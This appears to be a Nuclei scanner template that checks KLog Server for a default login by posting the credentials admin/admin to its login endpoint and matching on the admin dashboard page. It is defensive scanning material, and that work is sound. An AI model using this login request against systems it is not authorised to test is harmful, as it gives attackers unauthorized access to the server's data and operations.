http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - contains_all(body, "<title>KLog Server", "ADMIN", "Dashboard")
    - status_code == 200
    type: dsl
  max-redirects: 3
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /actions/entree.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    user={{username}}&pswd={{password}}&action=login

    '
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
id: klog-server-default-login
info:
  author: s4e-io
  description: 'KLog Server contains a default login vulnerability. An attacker can
    obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.

    '
  metadata:
    max-request: 2
    product: klog_server
    vendor: klogserver
  name: KLog Server - Default Login
  reference:
  - https://www.klogserver.com/
  severity: high
  tags: default-login,klog-server,vuln
